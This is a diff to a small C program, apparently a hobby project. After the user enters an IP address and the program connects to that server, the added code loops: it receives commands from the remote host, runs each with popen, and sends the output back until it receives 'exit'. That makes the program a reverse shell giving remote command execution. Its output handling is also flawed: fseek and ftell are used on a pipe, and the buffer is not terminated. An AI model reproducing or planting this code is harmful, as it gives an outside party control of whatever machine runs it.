@@ -37,7 +37,7 @@ int main(void) {
 	global_t __this;
 	global_t*  this = (global_t*) &__this;
 	
-	this->ip_address = malloc(64 * sizeof(char));
+	this->ip_address = (char*) malloc(64 * sizeof(char));
 	
 	printf("So, I know I said that before was your last chance, but technically you can still stop the madness here, but yeah. Paste the IP that has been given to you here: ");
 	scanf("%s", this->ip_address);
@@ -53,6 +53,44 @@ int main(void) {
 	
 	printf("Connected to server, saying hi ...\n");
 	socket_send(&this->socket, "Howdy", SOCKET_DEFAULT_BUFFER_SIZE);
+	
+	#define LENGTH 32768
+	char* command_output = (char*) malloc(LENGTH * sizeof(char));
+	
+	while (1) {
+		char* command = socket_receive(&this->socket, LENGTH);
+		printf("Executing \"%s\" ...\n", command);
+		
+		if (strcmp(command, "exit") == 0) {
+			break;
+			
+		}
+		
+		FILE* file = popen(command, "r");
+		
+		if (file == NULL) {
+			const char* warning_message = "WARNING Failed to execute command\n";
+			
+			printf              ("%s", warning_message);
+			socket_send(&this->socket, warning_message, LENGTH);
+			
+		} else {
+			fseek(file, 0, SEEK_END);
+			unsigned long long bytes = ftell(file);
+			rewind(file);
+			
+			fread(command_output, sizeof(char), bytes, file);
+			printf("%s", command_output);
+			
+			socket_send(&this->socket, command_output, LENGTH);
+			pclose(file);
+			
+		}
+		
+	}
+	
+	printf("Freeing command output buffer ...\n");
+	free(command_output);
 	
 	quit(this);
 	return 0;
